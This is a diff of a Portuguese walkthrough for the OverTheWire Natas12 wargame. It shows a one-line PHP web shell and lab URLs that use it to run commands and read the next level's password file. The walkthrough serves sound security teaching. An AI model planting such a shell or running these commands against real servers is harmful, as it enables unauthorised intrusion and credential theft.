@@ -59,9 +59,12 @@ Conteúdo do arquivo shell.php:
 PHP
 
 <?php system($_GET['cmd']); ?>
-Acesso ao shell web (após upload e manipulação do nome): `http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php`  
-Verificar RCE: `http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php?cmd=pwd`  
-Obter senha do Natas13: `http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php?cmd=cat%20/etc/natas_webpass/natas13`  
+Acesso ao shell web (após upload e manipulação do nome):  
+`http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php`  
+Verificar RCE:   
+`http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php?cmd=pwd`  
+Obter senha do Natas13:   
+`http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php?cmd=cat%20/etc/natas_webpass/natas13`  
 
 ---
 
